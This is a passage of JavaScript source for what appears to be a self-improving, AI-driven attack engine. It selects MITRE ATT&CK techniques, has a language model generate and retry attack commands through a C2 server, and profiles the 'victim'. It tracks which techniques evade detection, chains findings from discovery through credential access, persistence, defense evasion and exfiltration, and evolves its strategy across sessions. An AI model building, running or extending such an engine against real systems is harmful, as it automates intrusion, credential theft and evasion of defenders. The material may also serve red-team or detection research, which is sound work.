      return { success: false, output: JSON.stringify(res.body), queued_at: ts, command };
    }
  } catch (e) {
    return { success: false, output: e.message, queued_at: ts, command };
  }
}

// ── Knowledge Update ──────────────────────────────────────────────────────────
function updateKnowledge(kb, technique, command, commandSource, analysis, attempt) {
  const tid = technique.id;
  const ts  = new Date().toISOString();

  if (!kb.techniques[tid]) {
    kb.techniques[tid] = {
      technique_id:       tid,
      name:               technique.name,
      tactic:             technique.tactic,
      attempts:           0,
      successes:          0,
      failures:           0,
      success_rate:       0,
      weight:             1.0,
      detection_rate:     0,
      commands:           [],
      failure_reasons:    [],
      discovery_value:    0,
      platform_confirmed: ['Linux'],
      notes:              '',
      first_seen:         ts,
      last_seen:          ts,
    };
  }

  const entry = kb.techniques[tid];
  entry.last_seen = ts;
  entry.attempts++;

  if (analysis.success) {
    entry.successes++;
    kb.global_stats.total_successes++;
    entry.discovery_value = entry.discovery_value * 0.7 + analysis.discovery_value * 0.3;
  } else {
    entry.failures++;
    kb.global_stats.total_failures++;
    if (analysis.failure_reason && !entry.failure_reasons.includes(analysis.failure_reason)) {
      entry.failure_reasons.push(analysis.failure_reason);
    }
  }

  entry.success_rate = entry.attempts > 0 ? entry.successes / entry.attempts : 0;

  // Weight formula: success rate + discovery value - detection penalty
  const detectionPenalty = (entry.detection_rate || 0) * 0.5;
  entry.weight = Math.max(0.1,
    0.5 + (entry.success_rate * 1.5) + (entry.discovery_value * 0.5) - detectionPenalty
  );

  // Update command record
  if (command) {
    const existing = entry.commands.find(c => c.command === command);
    if (existing) {
      existing.attempts++;
      if (analysis.success) existing.successes++;
      existing.last_seen = ts;
      if (analysis.success) {
        existing.avg_output_length = Math.round(
          (existing.avg_output_length * 0.7) + (analysis.output_length * 0.3)
        );
      }
    } else {
      entry.commands.push({
        command,
        source:            commandSource,
        attempts:          1,
        successes:         analysis.success ? 1 : 0,
        avg_output_length: analysis.output_length,
        first_seen:        ts,
        last_seen:         ts,
      });

      if (commandSource === 'ai-generated')   kb.global_stats.total_ai_commands++;
      if (commandSource === 'self-improved')  kb.global_stats.total_self_improvements++;
      if (commandSource === 'stealth-improved') kb.global_stats.total_self_improvements++;
    }
  }

  // Store AI analysis notes
  if (analysis.ai_analysis?.attacker_utility) {
    entry.notes = analysis.ai_analysis.attacker_utility;
  }

  // Update tactic weight
  kb.global_stats.total_techniques_tried++;
  const tacticTechs = Object.values(kb.techniques).filter(t => t.tactic === technique.tactic);
  if (tacticTechs.length > 0) {
    const avgRate = tacticTechs.reduce((s, t) => s + t.success_rate, 0) / tacticTechs.length;
    kb.tactic_weights[technique.tactic] = 0.5 + avgRate;
  }

  return entry;
}

// ── Main Tactic Loop ──────────────────────────────────────────────────────────
async function runTactic(tactic, options = {}) {
  const {
    maxTechniques   = 5,
    maxRetries      = 3,
    waitSeconds     = 15,
    excludeIds      = [],
    chainIntel      = [],
    victimProfile   = null,
  } = options;

  console.log(`\n${'═'.repeat(60)}`);
  console.log(`  TACTIC: ${tactic.toUpperCase()}`);
  console.log(`  Techniques: ${maxTechniques} | Retries: ${maxRetries} | Wait: ${waitSeconds}s`);
  if (chainIntel.length) console.log(`  Chain intelligence: ${chainIntel.length} previous findings`);
  console.log(`${'═'.repeat(60)}`);

  const kb      = loadKB();
  const session = loadSession();
  const results = [];
  const executed = [...excludeIds];
  const newChainIntel = [];

  // Get available techniques
  let availableTechniques = [];
  try {
    const searchRes = await c2('GET', `/api/mitre/search/${tactic}`);
    if (Array.isArray(searchRes.body)) {
      availableTechniques = searchRes.body.map(t => ({
        id:          t.technique_id,
        name:        t.name,
        description: t.description,
        tactic,
        platforms:   ['Linux'],
      }));
    }
  } catch {}

  if (!availableTechniques.length) {
    availableTechniques = getFallbackTechniques(tactic);
  }

  // Apply profile avoid list
  const avoidList = victimProfile?.interpreted?.avoid_techniques || [];
  if (avoidList.length) {
    const before = availableTechniques.length;
    availableTechniques = availableTechniques.filter(t => !avoidList.includes(t.id));
    if (availableTechniques.length < before) {
      console.log(`  ⚠  Filtered ${before - availableTechniques.length} techniques (profile: avoid GUI/unsupported)`);
    }
  }

  console.log(`  Found ${availableTechniques.length} available techniques\n`);

  for (let i = 0; i < maxTechniques; i++) {
    console.log(`\n─── Technique ${i + 1}/${maxTechniques} ───`);

    // Select technique — use chaining if we have prior intel
    let technique;
    if (chainIntel.length > 0 || newChainIntel.length > 0) {
      technique = await selectWithChaining(
        tactic,
        availableTechniques,
        kb,
        executed,
        [...chainIntel, ...newChainIntel],
        victimProfile
      );
    } else if (OPENAI_API_KEY) {
      // Standard AI selection
      technique = await selectTechniqueAI(tactic, availableTechniques, kb, executed);
    } else {
      technique = selectTechniqueWeighted(availableTechniques, kb, executed);
    }

    if (!technique) {
      console.log('  No more techniques available');
      break;
    }

    executed.push(technique.id);
    console.log(`  Target: ${technique.id} — ${technique.name}`);

    let iteration = {
      technique_id:   technique.id,
      technique_name: technique.name,
      tactic,
      attempts:       [],
      final_success:  false,
      self_improved:  false,
      stealth_used:   false,
      chain_used:     chainIntel.length > 0 || newChainIntel.length > 0,
      started_at:     new Date().toISOString(),
    };

    let previousFailureInfo = null;
    let lastDetectionInfo   = null;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      if (attempt > 1) {
        console.log(`\n  ↺ Retry ${attempt}/${maxRetries}...`);
      }

      // Generate command with all context
      const { command, source } = await generateCommand(
        technique, kb, attempt, previousFailureInfo, lastDetectionInfo, victimProfile
      );
      console.log(`  Source: ${source}`);

      // Execute
      const execTime  = new Date().toISOString();
      const execResult = await executeTechnique(technique, command, waitSeconds);

      // Check detection (v3: new)
      lastDetectionInfo = await checkDetection(technique, execTime, kb);

      // Analyze output (v3: structured intelligence)
      const analysis = await analyzeOutput(
        technique, command, execResult.output, attempt, victimProfile
      );

      console.log(`  Result: ${analysis.success ? '✅ SUCCESS' : '❌ FAILED'}`);
      if (execResult.output.length > 0) {
        console.log(`  Output: ${execResult.output.slice(0, 100).replace(/\n/g, ' ')}${execResult.output.length > 100 ? '...' : ''}`);
      }
      if (analysis.sensitive_data)   console.log(`  ⚠  SENSITIVE DATA — value: ${analysis.discovery_value.toFixed(2)}`);
      if (analysis.detection_likely) console.log(`  🚨 Detection likely triggered`);
      if (lastDetectionInfo.detected) {
        iteration.stealth_used = true;
      }

      // Record attempt
      iteration.attempts.push({
        attempt,
        command:          command || 'standard-api',
        source,
        success:          analysis.success,
        output_length:    analysis.output_length,
        output_snippet:   execResult.output.slice(0, 200),
        failure_reason:   analysis.failure_reason,
        discovery_value:  analysis.discovery_value,
        sensitive_data:   analysis.sensitive_data,
        detected:         lastDetectionInfo.detected,
        intelligence:     analysis.intelligence,
      });

      // Update KB
      updateKnowledge(kb, technique, command, source, analysis, attempt);
      saveKB(kb);

      // Log research
      logResearch({
        type:            'execution',
        session_id:      session.session_id,
        technique_id:    technique.id,
        tactic,
        attempt,
        command:         command || 'standard',
        source,
        success:         analysis.success,
        output_length:   analysis.output_length,
        discovery_value: analysis.discovery_value,
        sensitive_data:  analysis.sensitive_data,
        detected:        lastDetectionInfo.detected,
        intelligence:    analysis.intelligence,
      });

      if (analysis.success) {
        iteration.final_success = true;
        if (attempt > 1) {
          iteration.self_improved = true;
          console.log(`  ✨ SELF-IMPROVED — succeeded on attempt ${attempt}`);
        }

        // Add to chain intelligence for next technique selection
        if (Object.values(analysis.intelligence).some(v =>
          Array.isArray(v) ? v.length > 0 : typeof v === 'object' ? Object.keys(v).length > 0 : false
        )) {
          newChainIntel.push({
            technique_id:   technique.id,
            tactic,
            ...analysis.intelligence,
          });
        }
        break;
      } else {
        previousFailureInfo = { command, output: execResult.output };
        if (attempt < maxRetries) {
          console.log(`  Reason: ${analysis.failure_reason || 'unknown'}`);
        }
      }
    }

    iteration.ended_at = new Date().toISOString();
    results.push(iteration);

    // Update session metrics
    session.metrics.techniques_tried++;
    if (iteration.final_success) session.metrics.successes++;
    else session.metrics.failures++;
    if (iteration.self_improved) session.metrics.self_improvements++;
    if (lastDetectionInfo?.detected) session.metrics.detections_triggered++;
    else session.metrics.detections_evaded++;
    const aiAttempts = iteration.attempts.filter(a => a.source.includes('ai') || a.source.includes('stealth'));
    session.metrics.ai_commands_generated += aiAttempts.length;

    saveSession(session);
  }

  // Session metrics
  session.metrics.avg_success_rate   = session.metrics.techniques_tried > 0
    ? session.metrics.successes / session.metrics.techniques_tried : 0;
  session.metrics.improvement_rate   = session.metrics.techniques_tried > 0
    ? session.metrics.self_improvements / session.metrics.techniques_tried : 0;

  const successes   = results.filter(r => r.final_success).length;
  const selfImproved = results.filter(r => r.self_improved).length;
  const stealthUsed = results.filter(r => r.stealth_used).length;
  const chainUsed   = results.filter(r => r.chain_used).length;
  const aiGenerated = results.flatMap(r => r.attempts).filter(a => a.source.includes('ai') || a.source.includes('stealth')).length;

  console.log(`\n${'─'.repeat(60)}`);
  console.log(`TACTIC COMPLETE: ${tactic.toUpperCase()}`);
  console.log(`  Techniques tried : ${results.length}`);
  console.log(`  Successes        : ${successes}/${results.length}`);
  console.log(`  AI-gen commands  : ${aiGenerated}`);
  console.log(`  Self-improved    : ${selfImproved}`);
  console.log(`  Stealth evasion  : ${stealthUsed}`);
  console.log(`  Chain-selected   : ${chainUsed}`);
  console.log(`  Success rate     : ${(successes/results.length*100).toFixed(1)}%`);
  console.log(`${'─'.repeat(60)}`);

  logResearch({
    type:          'tactic_complete',
    session_id:    session.session_id,
    tactic,
    techniques:    results.length,
    successes,
    self_improved: selfImproved,
    ai_generated:  aiGenerated,
    stealth_used:  stealthUsed,
    chain_used:    chainUsed,
    new_intel:     newChainIntel.length,
  });

  saveSession(session);
  return { results, successes, selfImproved, aiGenerated, newChainIntel };
}

// ── AI Technique Selection (standalone) ──────────────────────────────────────
async function selectTechniqueAI(tactic, candidates, kb, excludeIds) {
  const filtered = candidates.filter(t => !excludeIds.includes(t.id));
  if (!filtered.length) return null;

  const strategy  = loadStrategy();
  const avoidList = strategy?.avoid_techniques || [];

  const top = filtered
    .map(t => {
      const known = kb.techniques[t.id];
      let weight  = known?.weight || 1.3;
      if (avoidList.includes(t.id)) weight *= 0.1;
      if ((known?.detection_rate || 0) > 0.5) weight *= 0.6;
      return { ...t, weight };
    })
    .sort((a, b) => b.weight - a.weight)
    .slice(0, 8);

  const techList = top.map(t => {
    const known = kb.techniques[t.id];
    const perf  = known
      ? `(success:${(known.success_rate*100).toFixed(0)}%, detection:${((known.detection_rate||0)*100).toFixed(0)}%, weight:${known.weight?.toFixed(2)})`
      : '(novel)';
    return `- ${t.id}: ${t.name} ${perf}`;
  }).join('\n');

  const aiChoice = await ai(
    `You are a red team AI selecting the next attack technique.
Choose based on highest expected value: success_rate × (1 - detection_rate).
Prefer novel techniques for exploration. Avoid noisy detected techniques.
Respond with ONLY the technique ID (e.g. T1082).`,
    `Tactic: ${tactic}
Candidates:
${techList}
Already executed: ${excludeIds.join(', ') || 'none'}
Reply with ONLY the T-code:`,
    0.2, 15
  );

  if (aiChoice) {
    const match = aiChoice.match(/T\d{4}(\.\d{3})?/i);
    if (match) {
      const chosen = top.find(t => t.id.toUpperCase() === match[0].toUpperCase());
      if (chosen) {
        console.log(`  🤖 AI selected: ${chosen.id} — ${chosen.name}`);
        return chosen;
      }
    }
  }

  return selectTechniqueWeighted(candidates, kb, excludeIds);
}

// ── Full Kill Chain ───────────────────────────────────────────────────────────
async function runFullChain(tactics, options = {}) {
  console.log(`\n${'╔' + '═'.repeat(58) + '╗'}`);
  console.log(`║  FULL AUTONOMOUS KILL CHAIN v3.0${' '.repeat(25)}║`);
  console.log(`║  Tactics: ${tactics.join(', ')}${' '.repeat(Math.max(0, 47 - tactics.join(', ').length))}║`);
  console.log(`${'╚' + '═'.repeat(58) + '╝'}`);

  const kb = loadKB();
  kb.total_sessions++;
  saveKB(kb);

  const session = loadSession();
  session.session_id = `session_${Date.now()}`;
  session.started    = new Date().toISOString();
  saveSession(session);

  // Step 1: Profile victim (new in v3)
  let victimProfile = loadProfile();
  if (!victimProfile || options.reprofile) {
    victimProfile = await profileVictim();
  } else {
    console.log('\n📋 Using cached victim profile');
    if (victimProfile.interpreted) {
      console.log(`   Target: ${victimProfile.interpreted.os} | ${victimProfile.interpreted.current_user}`);
    }
  }
  session.victim_profile = victimProfile?.interpreted;

  // Step 2: Run tactics with chain intelligence passing between them
  const allResults       = {};
  const allExecuted      = [];
  const chainStart       = Date.now();
  let   cumulativeIntel  = [];  // grows as each tactic adds findings

  for (const tactic of tactics) {
    const result = await runTactic(tactic, {
      ...options,
      excludeIds:    [...allExecuted],
      chainIntel:    cumulativeIntel,
      victimProfile,
    });

    allResults[tactic] = result;
    allExecuted.push(...result.results.map(r => r.technique_id));

    // Accumulate intelligence for next tactic
    if (result.newChainIntel?.length) {
      cumulativeIntel = [...cumulativeIntel, ...result.newChainIntel];
      console.log(`\n  ⛓  Chain intelligence: ${cumulativeIntel.length} findings available for next tactic`);
    }

    await sleep(2000);
  }

  // Step 3: Strategy evolution every 3 sessions (new in v3)
  const finalKb = loadKB();
  if (finalKb.total_sessions % 3 === 0) {
    console.log(`\n  🔄 Session ${finalKb.total_sessions} — triggering strategy evolution`);
    await evolveStrategy(finalKb);
  }

  // Summary
  const totalTime  = ((Date.now() - chainStart) / 1000).toFixed(1);
  const totalTried = Object.values(allResults).reduce((s, r) => s + r.results.length, 0);
  const totalSucc  = Object.values(allResults).reduce((s, r) => s + r.successes, 0);
  const totalSI    = Object.values(allResults).reduce((s, r) => s + r.selfImproved, 0);
  const totalAI    = Object.values(allResults).reduce((s, r) => s + r.aiGenerated, 0);

  console.log(`\n${'╔' + '═'.repeat(58) + '╗'}`);
  console.log(`║  KILL CHAIN COMPLETE v3.0${' '.repeat(32)}║`);
  console.log(`║  Time           : ${totalTime}s${' '.repeat(38 - totalTime.length)}║`);
  console.log(`║  Techniques     : ${totalTried}${' '.repeat(38 - String(totalTried).length)}║`);
  console.log(`║  Successes      : ${totalSucc}/${totalTried}${' '.repeat(36 - String(totalSucc).length - String(totalTried).length)}║`);
  console.log(`║  AI-generated   : ${totalAI}${' '.repeat(38 - String(totalAI).length)}║`);
  console.log(`║  Self-improved  : ${totalSI}${' '.repeat(38 - String(totalSI).length)}║`);
  console.log(`║  Chain intel    : ${cumulativeIntel.length} findings${' '.repeat(29 - String(cumulativeIntel.length).length)}║`);
  console.log(`║  Success rate   : ${(totalSucc/Math.max(totalTried,1)*100).toFixed(1)}%${' '.repeat(36 - (totalSucc/Math.max(totalTried,1)*100).toFixed(1).length)}║`);
  console.log(`${'╚' + '═'.repeat(58) + '╝'}`);

  logResearch({
    type:          'chain_complete',
    tactics,
    total_time_s:  totalTime,
    techniques:    totalTried,
    successes:     totalSucc,
    self_improved: totalSI,
    ai_generated:  totalAI,
    chain_intel:   cumulativeIntel.length,
    victim_profile: victimProfile?.interpreted,
  });

  return allResults;
}

// ── Stats ─────────────────────────────────────────────────────────────────────
function showStats() {
  const kb       = loadKB();
  const session  = readJSON(SESSION_FILE, null);
  const strategy = loadStrategy();
  const profile  = loadProfile();

  console.log(`\n${'═'.repeat(60)}`);
  console.log('  SELF-IMPROVEMENT ENGINE v3.0 STATISTICS');
  console.log(`${'═'.repeat(60)}`);

  if (profile?.interpreted) {
    console.log(`\n  VICTIM PROFILE`);
    console.log(`  OS       : ${profile.interpreted.os}`);
    console.log(`  User     : ${profile.interpreted.current_user} (root: ${profile.interpreted.is_root})`);
    console.log(`  Container: ${profile.interpreted.is_container} | GUI: ${profile.interpreted.has_gui}`);
    console.log(`  Services : ${(profile.interpreted.running_services || []).slice(0, 5).join(', ')}`);
    console.log(`  Avoid    : ${(profile.interpreted.avoid_techniques || []).join(', ') || 'none'}`);
  }

  console.log(`\n  GLOBAL STATS`);
  console.log(`  Sessions         : ${kb.total_sessions}`);
  console.log(`  Techniques tried : ${kb.global_stats.total_techniques_tried}`);
  console.log(`  Successes        : ${kb.global_stats.total_successes}`);
  console.log(`  Failures         : ${kb.global_stats.total_failures}`);
  console.log(`  AI-gen commands  : ${kb.global_stats.total_ai_commands}`);
  console.log(`  Self-improvements: ${kb.global_stats.total_self_improvements}`);
  console.log(`  Detections       : ${kb.global_stats.total_detections}`);
  console.log(`  Evaded           : ${kb.global_stats.total_detections_evaded}`);
  console.log(`  Novel techniques : ${kb.global_stats.novel_techniques_discovered}`);

  const techCount = Object.keys(kb.techniques).length;
  if (techCount > 0) {
    const avgSuccess = Object.values(kb.techniques)
      .reduce((s, t) => s + t.success_rate, 0) / techCount;
    const avgDetect  = Object.values(kb.techniques)
      .reduce((s, t) => s + (t.detection_rate || 0), 0) / techCount;
    const topTechs   = Object.values(kb.techniques)
      .sort((a, b) => b.weight - a.weight).slice(0, 5);

    console.log(`\n  KNOWLEDGE BASE`);
    console.log(`  Techniques known : ${techCount}`);
    console.log(`  Avg success rate : ${(avgSuccess * 100).toFixed(1)}%`);
    console.log(`  Avg detection    : ${(avgDetect * 100).toFixed(1)}%`);

    console.log(`\n  TOP TECHNIQUES (by weight)`);
    topTechs.forEach((t, i) => {
      const detBar = t.detection_rate > 0.3 ? ' 🚨' : t.detection_rate < 0.1 ? ' 🥷' : '';
      console.log(`  ${i + 1}. ${t.technique_id} — ${t.name}${detBar}`);
      console.log(`     Weight:${t.weight.toFixed(2)} | Success:${(t.success_rate*100).toFixed(0)}% | Detection:${((t.detection_rate||0)*100).toFixed(0)}% | Attempts:${t.attempts}`);
    });
  }

  if (strategy) {
    console.log(`\n  EVOLVED STRATEGY v${strategy.version} (after ${strategy.after_sessions} sessions)`);
    console.log(`  ${strategy.summary?.slice(0, 150)}`);
    if (strategy.research_findings?.length) {
      console.log(`\n  RESEARCH FINDINGS`);
      strategy.research_findings.forEach(f => console.log(`  • ${f}`));
    }
    console.log(`  Next focus: ${strategy.next_session_focus}`);
  }

  if (session) {
    console.log(`\n  CURRENT SESSION: ${session.session_id}`);
    console.log(`  Success rate     : ${(session.metrics.avg_success_rate * 100).toFixed(1)}%`);
    console.log(`  Self-improvement : ${(session.metrics.improvement_rate * 100).toFixed(1)}%`);
    console.log(`  Detections       : ${session.metrics.detections_triggered}`);
    console.log(`  Evaded           : ${session.metrics.detections_evaded}`);
  }

  if (Object.keys(kb.tactic_weights).length > 0) {
    console.log(`\n  LEARNED TACTIC WEIGHTS`);
    Object.entries(kb.tactic_weights)
      .sort(([, a], [, b]) => b - a)
      .forEach(([t, w]) => console.log(`  ${t.padEnd(25)} ${w.toFixed(3)}`));
  }
  console.log(`${'═'.repeat(60)}\n`);
}

// ── Knowledge Display ─────────────────────────────────────────────────────────
function showKnowledge() {
  const kb    = loadKB();
  const techs = Object.values(kb.techniques).sort((a, b) => b.weight - a.weight);

  if (!techs.length) { console.log('No techniques learned yet.'); return; }

  console.log(`\n${'═'.repeat(70)}`);
  console.log('  KNOWLEDGE BASE v3.0 — LEARNED TECHNIQUES');
  console.log(`${'═'.repeat(70)}`);

  techs.forEach(t => {
    const bar     = '█'.repeat(Math.round(t.success_rate * 10)) + '░'.repeat(10 - Math.round(t.success_rate * 10));
    const detBar  = '█'.repeat(Math.round((t.detection_rate||0) * 10)) + '░'.repeat(10 - Math.round((t.detection_rate||0) * 10));
    const noisy   = (t.detection_rate || 0) > 0.3 ? ' 🚨 NOISY' : '';
    const stealthy= (t.detection_rate || 0) < 0.1 && t.success_rate > 0.5 ? ' 🥷 STEALTHY' : '';

    console.log(`\n  ${t.technique_id} — ${t.name}${noisy}${stealthy}`);
    console.log(`  Tactic     : ${t.tactic}`);
    console.log(`  Success    : [${bar}] ${(t.success_rate*100).toFixed(0)}% (${t.successes}/${t.attempts})`);
    console.log(`  Detection  : [${detBar}] ${((t.detection_rate||0)*100).toFixed(0)}%`);
    console.log(`  Weight     : ${t.weight.toFixed(3)} | Value: ${t.discovery_value.toFixed(2)}`);

    if (t.commands.length > 0) {
      console.log(`  Commands:`);
      t.commands.slice(0, 3).forEach(c => {
        const rate = c.attempts > 0 ? (c.successes / c.attempts * 100).toFixed(0) : '?';
        console.log(`    [${c.source}] ${c.command.slice(0, 65)}${c.command.length > 65 ? '...' : ''} (${rate}% success)`);
      });
    }
    if (t.failure_reasons.length > 0) {
      console.log(`  Failures   : ${t.failure_reasons.slice(0, 3).join(', ')}`);
    }
    if (t.notes) {
      console.log(`  Notes      : ${t.notes.slice(0, 100)}`);
    }
  });
  console.log(`\n${'═'.repeat(70)}\n`);
}

// ── Export Research ───────────────────────────────────────────────────────────
function exportResearch() {
  const kb       = loadKB();
  const strategy = loadStrategy();
  const profile  = loadProfile();
  const logs     = [];

  if (fs.existsSync(RESEARCH_FILE)) {
    fs.readFileSync(RESEARCH_FILE, 'utf8')
      .split('\n').filter(l => l.trim())
      .forEach(l => { try { logs.push(JSON.parse(l)); } catch {} });
  }

  const exportPath = path.join(MEMORY_DIR, `research_export_v3_${Date.now()}.json`);

  writeJSON(exportPath, {
    exported_at:    new Date().toISOString(),
    engine_version: '3.0',
    victim_profile: profile,
    knowledge_base: kb,
    strategy:       strategy,
    research_log:   logs,
    summary: {
      total_sessions:       kb.total_sessions,
      techniques_in_kb:     Object.keys(kb.techniques).length,
      global_stats:         kb.global_stats,
      top_5_by_weight:      Object.values(kb.techniques)
        .sort((a, b) => b.weight - a.weight).slice(0, 5)
        .map(t => ({ id: t.technique_id, name: t.name, success_rate: t.success_rate, detection_rate: t.detection_rate || 0, weight: t.weight })),
      stealthiest_techniques: Object.values(kb.techniques)
        .filter(t => t.attempts > 1 && t.success_rate > 0.5)
        .sort((a, b) => (a.detection_rate || 0) - (b.detection_rate || 0)).slice(0, 5)
        .map(t => ({ id: t.technique_id, detection_rate: t.detection_rate || 0 })),
      research_findings:    strategy?.research_findings || [],
    }
  });

  console.log(`\n✅ Research exported: ${exportPath}`);
  console.log(`   ${logs.length} log entries | ${Object.keys(kb.techniques).length} techniques | v3.0`);
}

// ── Fallback Techniques ───────────────────────────────────────────────────────
function getFallbackTechniques(tactic) {
  const map = {
    'discovery':            ['T1082','T1057','T1087','T1046','T1016','T1033','T1083','T1518'],
    'credential-access':    ['T1003','T1552','T1555','T1110'],
    'persistence':          ['T1053','T1547','T1505','T1098'],
    'privilege-escalation': ['T1068','T1548','T1134','T1055'],
    'defense-evasion':      ['T1070','T1562','T1222','T1036','T1027'],
    'lateral-movement':     ['T1021','T1570'],
    'collection':           ['T1005','T1119'],
    'exfiltration':         ['T1041','T1048'],
  };

  const names = {
    T1082:'System Information Discovery', T1057:'Process Discovery',
    T1087:'Account Discovery', T1046:'Network Service Scanning',
    T1016:'System Network Configuration', T1033:'System Owner Discovery',
    T1083:'File and Directory Discovery', T1518:'Software Discovery',
    T1003:'OS Credential Dumping', T1552:'Unsecured Credentials',
    T1555:'Credentials from Password Stores', T1110:'Brute Force',
    T1053:'Scheduled Task/Job', T1547:'Boot or Logon Autostart',
    T1505:'Server Software Component', T1098:'Account Manipulation',
    T1068:'Exploitation for Privilege Escalation', T1548:'Abuse Elevation Control',
    T1134:'Access Token Manipulation', T1055:'Process Injection',
    T1070:'Indicator Removal', T1562:'Impair Defenses',
    T1222:'File Permission Modification', T1036:'Masquerading', T1027:'Obfuscated Files',
    T1021:'Remote Services', T1570:'Lateral Tool Transfer',
    T1005:'Data from Local System', T1119:'Automated Collection',
    T1041:'Exfiltration Over C2 Channel', T1048:'Exfiltration Over Alternative Protocol',
  };

  const ids = map[tactic] || map['discovery'];
  return ids.map(id => ({
    id, tactic, platforms: ['Linux'],
    name: names[id] || id,
    description: `MITRE ATT&CK technique ${id}`,
  }));
}

// ── CLI ───────────────────────────────────────────────────────────────────────
const args    = process.argv.slice(2);
const cmd     = args[0];
const parseArgs = () => {
  const opts = {};
  for (let i = 1; i < args.length; i++) {
    if (args[i].startsWith('--')) {
      const key = args[i].slice(2);
      opts[key] = args[i+1] && !args[i+1].startsWith('--') ? args[++i] : true;
    }
  }
  return opts;
};

(async () => {
  const opts = parseArgs();

  switch (cmd) {
    case 'run': {
      const tactic  = opts.tactic     || 'discovery';
      const techs   = parseInt(opts.techniques || opts.iterations || 5);
      const retries = parseInt(opts.retries    || 3);
      const wait    = parseInt(opts.wait       || 15);
      const profile = loadProfile();
      await runTactic(tactic, { maxTechniques: techs, maxRetries: retries, waitSeconds: wait, victimProfile: profile });
      break;
    }

    case 'fullchain': {
      const tactics  = (opts.tactics || 'discovery,credential-access,persistence').split(',').map(t => t.trim());
      const iters    = parseInt(opts.iterations || opts.techniques || 3);
      const retries  = parseInt(opts.retries    || 3);
      const wait     = parseInt(opts.wait       || 12);
      const reprofile = !!opts.reprofile;
      await runFullChain(tactics, { maxTechniques: iters, maxRetries: retries, waitSeconds: wait, reprofile });
      break;
    }

    case 'profile':
      await profileVictim();
      break;

    case 'evolve': {
      const kb = loadKB();
      await evolveStrategy(kb);
      break;
    }

    case 'stats':
      showStats();
      break;

    case 'knowledge':
      showKnowledge();
      break;

    case 'export-research':
      exportResearch();
      break;

    case 'reset-session':
      writeJSON(SESSION_FILE, createNewSession());
      console.log('✅ Session reset');
      break;

    default:
      console.log(`
WebSecSim Self-Improving Attack Engine v3.0

Commands:
  run              Run attack for a single tactic
  fullchain        Run complete kill chain with all 5 improvements
  profile          Profile victim environment
  evolve           Force strategy evolution now
  stats            Show statistics including detection rates
  knowledge        Show knowledge base with detection rates
  export-research  Export all research data to JSON
  reset-session    Reset session metrics

Options for 'run':
  --tactic <n>       Tactic (default: discovery)
  --techniques <n>   Techniques to try (default: 5)
  --retries <n>      Max retries (default: 3)
  --wait <s>         Wait seconds per technique (default: 15)

Options for 'fullchain':
  --tactics <list>   Comma-separated tactics
  --iterations <n>   Techniques per tactic (default: 3)
  --retries <n>      Max retries (default: 3)
  --wait <s>         Wait seconds (default: 12)
  --reprofile        Force re-profile victim

v3.0 New Features:
  1. Victim environment fingerprinting
  2. Structured intelligence extraction
  3. Detection evasion learning
  4. Cross-session strategy evolution (every 3 sessions)
  5. Technique chaining with accumulated intelligence
`);
  }
  process.exit(0);
})().catch(err => {
  console.error('Fatal:', err.message);
  process.exit(1);
});
